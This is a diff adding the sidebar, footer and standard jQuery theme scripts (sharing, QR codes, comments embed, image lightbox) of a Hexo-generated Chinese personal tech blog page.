+				<li><a href="/tags/毕业季/" title="毕业季">毕业季<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/作品/" title="作品">作品<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/生活感言/" title="生活感言">生活感言<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/单例模式/" title="单例模式">单例模式<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/md5/" title="md5">md5<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/oschina-android-app/" title="oschina-android-app">oschina-android-app<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/常见3种架构/" title="常见3种架构">常见3种架构<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/注解/" title="注解">注解<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/异步事件处理/" title="异步事件处理">异步事件处理<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/调试/" title="调试">调试<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/性能/" title="性能">性能<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Android快捷方式/" title="Android快捷方式">Android快捷方式<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/常见问题总结/" title="常见问题总结">常见问题总结<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/MVVM/" title="MVVM">MVVM<sup>1</sup></a></li>
+			
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">友情链接</p>
+    <ul>
+        
+          <li>
+            
+            	<a href="http://jiajixin.cn/" target="_blank" title="学长的博客">Jason&#39;s Blog</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.changhuiyuan.com/" target="_blank" title="好友的博客">Eric Libaray</a>
+            
+          </li>
+        
+    </ul>
+</div>
+
+  <div class="rsspart">
+	<a href="/atom.xml" target="_blank" title="rss">RSS 订阅</a>
+</div>
+
+  <div class="weiboshow">
+  <p class="asidetitle">新浪微博</p>
+    <iframe width="100%" height="119" class="share_self"  frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=119&fansRow=2&ptype=1&speed=0&skin=9&isTitle=1&noborder=1&isWeibo=0&isFans=0&uid=1600625133&verifier=b349771a&dpc=1"></iframe>
+</div>
+
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	<div class="line">
+		<span></span>
+		<div class="author"></div>
+	</div>
+	
+	
+	<section class="info">
+		<p> 「一只笨鸟的成长史...」 <br/>
+			Better late than never.</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		<a href="http://weibo.com/1600625133" target="_blank" class="icon-weibo" title="微博"></a>
+		
+		
+		<a href="https://github.com/TopJohn" target="_blank" class="icon-github" title="github"></a>
+		
+		
+		
+		
+		
+		
+		<a href="https://www.douban.com/people/Top-John" target="_blank" class="icon-douban" title="豆瓣"></a>
+		
+		
+		<a href="http://www.zhihu.com/people/shuai-jiong" target="_blank" class="icon-zhihu" title="知乎"></a>
+		
+		
+		<a href="https://plus.google.com/114979210024559900000?rel=author" target="_blank" class="icon-google_plus" title="Google+"></a>
+		
+		
+		<a href="mailto:xzj19922010@163.com" target="_blank" class="icon-email" title="Email Me"></a>
+		
+	</div>
+			
+		
+
+		<p class="copyright">
+		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2016 
+		
+		<a href="/about" target="_blank" title="John">John</a>
+		
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<div class="hoverqrcode clearfix"></div>',
+  '<a class="overlay" id="qrcode"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+
+  $('.hoverqrcode').hide();
+
+  var myWidth = 0;
+  function updatehoverqrcode(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+    var qrsize = myWidth > 1024 ? 200:100;
+    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
+    var p = $('.article-share-qrcode').position();
+    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
+                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
+                          .qrcode(options);
+  };
+  $(window).resize(function(){
+    $('.hoverqrcode').hide();
+  });
+  $('.article-share-qrcode').click(function(){
+    updatehoverqrcode();
+    $('.hoverqrcode').toggle();
+  });
+  $('.article-share-qrcode').hover(function(){}, function(){
+      $('.hoverqrcode').hide();
+  });
+});   
+</script>
+
+
+
+<script type="text/javascript">
+  var duoshuoQuery = {short_name:"John"};
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = '//static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0] 
+    || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+</script> 
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  </body>
+</html>
